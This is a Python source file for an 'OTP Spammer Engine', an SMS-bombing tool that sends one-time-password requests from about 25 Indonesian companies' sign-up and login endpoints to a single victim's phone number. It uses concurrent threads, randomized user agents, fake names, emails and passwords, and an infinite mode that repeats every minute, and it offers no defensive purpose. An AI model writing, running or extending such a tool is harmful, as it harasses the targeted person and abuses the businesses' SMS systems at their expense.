#!/usr/bin/env python3
# main_engine.py - OTP Spammer Engine

import requests
import uuid
import random
import string
import time
import re
import json
import threading
import sys
import signal
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed

from utils import normalize, fmt_08, get_public_ip, generate_multipart, extract_csrf, get_random_user_agent
from handlers import (
    send_tuneup_otp, send_hashmicro_otp, send_internetrakyat_otp,
    send_ultramilk_register, send_kaniva_otp, send_jembatani_otp,
    send_rcx_otp, send_sahabatteknisi_otp, send_auto2000_otp,
    send_astra_daihatsu_otp, send_royal_canin_otp, send_watsons_otp,
    send_99co_otp, send_belirumah_otp, send_fastwork_otp,
    send_hrsbre_otp, send_erafone_otp, send_beautyhaul_otp,
    send_hainaya_otp, send_minumyukkaka_otp, send_sidemang_otp,
    send_lapormasbup_otp, send_ptsp_kemenag_otp, send_planetban_otp,
    send_klook_otp
)
from targets import TARGETS

init(autoreset=True)

print_lock = threading.Lock()
stop_flag = False
RATE_LIMIT_KEYWORDS = ['rate limit', 'too many', 'try again', 'limit', 'exceeded', 'banned', 'blocked']

global_callback = None

def log_target(idx, total, name, status, detail=""):
    with print_lock:
        if status == "SUCCESS":
            sym, col = "+", Fore.GREEN
        elif status == "LIMITED" or status == "BLOCKED":
            sym, col = "!", Fore.YELLOW
        elif status == "ERROR" or status == "TIMEOUT":
            sym, col = "x", Fore.RED
        else:
            sym, col = "-", Fore.RED
        print(f"{col}[{sym}]{Style.RESET_ALL} ({idx}/{total}) {name}: {status}" + (f" - {detail}" if detail else ""))
        
       
        if global_callback:
            try:
                global_callback(name, status, detail)
            except:
                pass

def process_target(api, target62, ip, idx, total):
    global stop_flag
    if stop_flag:
        return False
        
    name = api['name']
    status_text = "FAIL"
    detail = ""
    success = False

    try:
        session = requests.Session()
        session.headers.update({'User-Agent': get_random_user_agent()})

        post_type = api.get('post_type', '')
        
       
        if post_type == 'planetban':
            number = api['number_fmt'](target62)
            resp = send_planetban_otp(number)
            if resp and resp.status_code in [200, 201]:
                status_text, detail, success = "SUCCESS", "OTP sent", True
            elif resp and resp.status_code == 429:
                status_text, detail = "LIMITED", "Rate limit"
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'tuneup':
            number = api['number_fmt'](target62)
            resp = send_tuneup_otp(number)
            if resp and resp.status_code in [200, 201]:
                status_text, detail, success = "SUCCESS", "OTP sent", True
            elif resp and resp.status_code == 429:
                status_text, detail = "LIMITED", "Rate limit"
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'hashmicro':
            number = api['number_fmt'](target62)
            form_data = send_hashmicro_otp(number)
            if form_data:
                url = "https://website-api.hashmicro.com/api/add/3"
                payload = '&'.join([f"{k}={requests.utils.quote(str(v))}" for k, v in form_data.items()])
                resp = session.post(url, data=payload, timeout=15)
                if resp.status_code in [200, 201]:
                    status_text, detail, success = "SUCCESS", "OTP sent", True
                elif resp.status_code == 429:
                    status_text, detail = "LIMITED", "Rate limit"
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'internetrakyat':
            number = api['number_fmt'](target62)
            resp = send_internetrakyat_otp(number)
            if resp and resp.status_code in [200, 201]:
                try:
                    data = resp.json()
                    if data.get("statusCode") == 200:
                        status_text, detail, success = "SUCCESS", "OTP sent", True
                except:
                    status_text, detail, success = "SUCCESS", "OTP sent", True
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'klook':
            number = api['number_fmt'](target62)
            resp = send_klook_otp(number)
            if resp and resp.status_code in [200, 201]:
                status_text, detail, success = "SUCCESS", "OTP sent", True
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'ultramilk':
            resp = send_ultramilk_register(target62)
            if resp and resp.status_code in [200, 201]:
                status_text, detail, success = "SUCCESS", "OTP sent", True
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'kaniva':
            number = api['number_fmt'](target62)
            name_rand = 'User' + ''.join(random.choices(string.ascii_lowercase+string.digits, k=4))
            resp = send_kaniva_otp(number, name_rand)
            if resp and resp.status_code in [200, 201]:
                status_text, detail, success = "SUCCESS", "OTP sent", True
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'jembatani':
            number = api['number_fmt'](target62)
            name_rand = 'User' + ''.join(random.choices(string.ascii_lowercase+string.digits, k=4))
            password = "Test@" + ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + "#1"
            resp = send_jembatani_otp(number, name_rand, password)
            if resp and resp.status_code in [200, 201]:
                status_text, detail, success = "SUCCESS", "OTP sent", True
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'rcx':
            number = api['number_fmt'](target62)
            name_rand = 'User' + ''.join(random.choices(string.ascii_lowercase+string.digits, k=4))
            email = f'user{random.randint(1000,9999)}@mailnesia.com'
            resp = send_rcx_otp(number, name_rand, email)
            if resp and resp.status_code in [302, 303]:
                status_text, detail, success = "SUCCESS", "OTP triggered", True
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'sahabatteknisi':
            number = api['number_fmt'](target62)
            resp = send_sahabatteknisi_otp(number)
            if resp and resp.status_code in [200, 201]:
                status_text, detail, success = "SUCCESS", "OTP sent", True
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'auto2000':
            number = api['number_fmt'](target62)
            resp = send_auto2000_otp(number)
            if resp and resp.status_code == 200:
                try:
                    data = resp.json()
                    if data.get("acknowledge") == 1:
                        status_text, detail, success = "SUCCESS", "OTP sent", True
                except:
                    status_text, detail, success = "SUCCESS", "OTP sent", True
            elif resp and resp.status_code == 429:
                status_text, detail = "LIMITED", "Rate limit"
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'astra_daihatsu':
            number = api['number_fmt'](target62)
            resp = send_astra_daihatsu_otp(number)
            if resp and resp.status_code == 200:
                status_text, detail, success = "SUCCESS", "OTP sent", True
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'royal_canin':
            number = api['number_fmt'](target62)
            resp = send_royal_canin_otp(number)
            if resp and resp.status_code == 200:
                status_text, detail, success = "SUCCESS", "OTP sent", True
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'watsons':
            number = api['number_fmt'](target62)
            resp = send_watsons_otp(number)
            if resp and resp.status_code == 200:
                status_text, detail, success = "SUCCESS", "OTP sent", True
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == '99co':
            number = api['number_fmt'](target62)
            resp = send_99co_otp(number)
            if resp and resp.status_code in [200, 201]:
                status_text, detail, success = "SUCCESS", "OTP sent", True
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'belirumahco':
            number = api['number_fmt'](target62)
            resp = send_belirumah_otp(number)
            if resp and resp.status_code in [200, 201]:
                status_text, detail, success = "SUCCESS", "OTP sent", True
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'fastworkid':
            number = api['number_fmt'](target62)
            resp = send_fastwork_otp(number)
            if resp and resp.status_code in [200, 201]:
                status_text, detail, success = "SUCCESS", "OTP sent", True
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'hrsbre':
            number = api['number_fmt'](target62)
            code, text = send_hrsbre_otp(number)
            if code in [200, 201]:
                status_text, detail, success = "SUCCESS", "OTP sent", True
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'erafone':
            number = api['number_fmt'](target62)
            code, resp = send_erafone_otp(number)
            if code == 200:
                status_text, detail, success = "SUCCESS", "OTP sent", True
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'beautyhaul':
            number = api['number_fmt'](target62)
            resp = send_beautyhaul_otp(number)
            if resp and resp.status_code in [200, 201]:
                status_text, detail, success = "SUCCESS", "OTP sent", True
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'hainaya':
            number = api['number_fmt'](target62)
            resp = send_hainaya_otp(number)
            if resp and resp.status_code in [200, 201, 409]:
                status_text, detail, success = "SUCCESS", "OTP sent", True
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'minumyukkaka':
            number = api['number_fmt'](target62)
            resp = send_minumyukkaka_otp(number)
            if resp and resp.status_code == 200:
                try:
                    data = resp.json()
                    if data.get('IsSuccess') == True:
                        status_text, detail, success = "SUCCESS", "OTP sent", True
                except:
                    status_text, detail, success = "SUCCESS", "OTP sent", True
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'sidemang':
            number = api['number_fmt'](target62)
            resp = send_sidemang_otp(number)
            if resp and resp.status_code == 200:
                try:
                    data = resp.json()
                    if data.get('otpDispatched') == True:
                        status_text, detail, success = "SUCCESS", "OTP sent", True
                except:
                    status_text, detail, success = "SUCCESS", "OTP sent", True
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'lapormasbup':
            number = api['number_fmt'](target62)
            resp, is_resend = send_lapormasbup_otp(number)
            if resp and resp.status_code in [200, 201]:
                status_text, detail, success = "SUCCESS", "OTP sent", True
            log_target(idx, total, name, status_text, detail)
            return success

        elif post_type == 'ptspkemenag':
            number = api['number_fmt'](target62)
            resp = send_ptsp_kemenag_otp(number)
            if resp and resp.status_code in [200, 201]:
                status_text, detail, success = "SUCCESS", "OTP sent", True
            log_target(idx, total, name, status_text, detail)
            return success

        
        elif post_type == 'json':
            number = api['number_fmt'](target62)
            url = api.get('url', '').replace('{rand}', str(uuid.uuid4()))
            referer = api.get('referer', '').replace('{raw}', target62)
            
            if referer:
                try:
                    session.get(referer, timeout=8)
                except:
                    pass
            
            payload_str = api['payload'].replace('{number}', str(number))\
                .replace('{rand}', str(uuid.uuid4()))\
                .replace('{ip}', ip)\
                .replace('{raw}', target62)\
                .replace('{name}', 'User'+str(random.randint(100,999)))\
                .replace('{email}', f'user{random.randint(1000,9999)}@mailnesia.com')\
                .replace('{pw}', 'Pass'+''.join(random.choices(string.ascii_letters+string.digits, k=6))+'@1')
            
            headers = api.get('headers', {}).copy()
            headers['User-Agent'] = get_random_user_agent()
            
            resp = session.post(url, headers=headers, data=payload_str, timeout=15)
            
            if resp.status_code in [200, 201, 202]:
                status_text, detail, success = "SUCCESS", "OTP sent", True
            elif resp.status_code == 429:
                status_text, detail = "LIMITED", "Rate limit"
            elif resp.status_code == 403:
                status_text, detail = "BLOCKED", "Forbidden"
            else:
                text = resp.text.lower() if resp.text else ""
                keywords = api.get('success_on', [])
                if any(kw in text for kw in keywords):
                    status_text, detail, success = "SUCCESS", "OTP sent", True
                else:
                    status_text = "FAIL"
                    detail = f"({resp.status_code})"
            
            log_target(idx, total, name, status_text, detail)
            return success

        else:
            status_text = "SKIP"
            detail = "Unknown post_type"
            log_target(idx, total, name, status_text, detail)
            return False

    except requests.exceptions.Timeout:
        log_target(idx, total, name, "TIMEOUT", "")
    except requests.exceptions.ConnectionError:
        log_target(idx, total, name, "CONN_ERR", "")
    except Exception as e:
        log_target(idx, total, name, "ERROR", str(e)[:40])

    return success

def run_single_round(threads=5, target=None, callback=None):
    """Jalankan Single Round"""
    global stop_flag, global_callback
    stop_flag = False
    global_callback = callback
    
    total_apis = len(TARGETS)
    print()
    print(f"{Fore.CYAN}Memulai spam menggunakan {Fore.WHITE}{total_apis}{Fore.CYAN} API{Style.RESET_ALL}")
    print()
    
    
    if target is None:
        target = input(f"{Fore.WHITE}Nomor target (08xx / +62xx): {Style.RESET_ALL}").strip()
    
    if not target:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Nomor tidak boleh kosong!")
        return False
    
    target62 = normalize(target)
    if not target62:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Format nomor tidak valid. Gunakan format 08xx atau +62xx")
        return False
    
    ip = get_public_ip()
    success_count = 0
    total_targets = len(TARGETS)
    
    def signal_handler(sig, frame):
        global stop_flag
        stop_flag = True
        print()
        print(f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL} Menghentikan proses...")
        raise KeyboardInterrupt
    
    original_handler = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for idx, api in enumerate(TARGETS, 1):
                if stop_flag:
                    break
                futures.append(executor.submit(process_target, api, target62, ip, idx, total_targets))
            
            for future in as_completed(futures):
                if stop_flag:
                    for f in futures:
                        f.cancel()
                    break
                try:
                    if future.result():
                        success_count += 1
                except:
                    pass
    except KeyboardInterrupt:
        pass
    finally:
        signal.signal(signal.SIGINT, original_handler)
        global_callback = None
    
    if stop_flag:
        print(f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL} Proses dihentikan. Total sukses: {success_count}/{total_targets}")
    else:
        print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Selesai. Sukses: {success_count}/{total_targets}")
    
    return success_count > 0

def run_infinite_loop(target=None, callback=None):
    """Jalankan Infinite Loop"""
    global stop_flag, global_callback
    stop_flag = False
    global_callback = callback
    
    total_apis = len(TARGETS)
    print()
    print(f"{Fore.CYAN}Memulai spam menggunakan {Fore.WHITE}{total_apis}{Fore.CYAN} API{Style.RESET_ALL}")
    print()
    
    print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Menjalankan Infinite Loop (delay 60 detik)...")
    
   
    if target is None:
        target = input(f"{Fore.WHITE}Nomor target (08xx / +62xx): {Style.RESET_ALL}").strip()
    
    if not target:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Nomor tidak boleh kosong!")
        return False
    
    target62 = normalize(target)
    if not target62:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Format nomor tidak valid. Gunakan format 08xx atau +62xx")
        return False
    
    ip = get_public_ip()
    total_success = 0
    total_fail = 0
    round_count = 0
    
    def signal_handler(sig, frame):
        global stop_flag
        stop_flag = True
        print()
        print(f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL} Menghentikan proses...")
        raise KeyboardInterrupt
    
    original_handler = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        while not stop_flag:
            round_count += 1
            print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Round {round_count} dimulai...")
            success_count = 0
            total_targets = len(TARGETS)
            
            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = []
                for idx, api in enumerate(TARGETS, 1):
                    if stop_flag:
                        break
                    futures.append(executor.submit(process_target, api, target62, ip, idx, total_targets))
                
                for future in as_completed(futures):
                    if stop_flag:
                        for f in futures:
                            f.cancel()
                        break
                    try:
                        if future.result():
                            success_count += 1
                            total_success += 1
                        else:
                            total_fail += 1
                    except:
                        total_fail += 1
            
            if stop_flag:
                break
                
            print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Round {round_count} selesai. Sukses: {success_count}/{total_targets}")
            print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Total: success={total_success} | fail={total_fail}")
            print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Menunggu 60 detik...")
            
            for _ in range(60):
                if stop_flag:
                    break
                time.sleep(1)
            
    except KeyboardInterrupt:
        pass
    finally:
        signal.signal(signal.SIGINT, original_handler)
        global_callback = None
    
    if stop_flag:
        print(f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL} Proses dihentikan oleh user")
        print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Total success: {total_success} | fail: {total_fail}")
    
    return total_success > 0
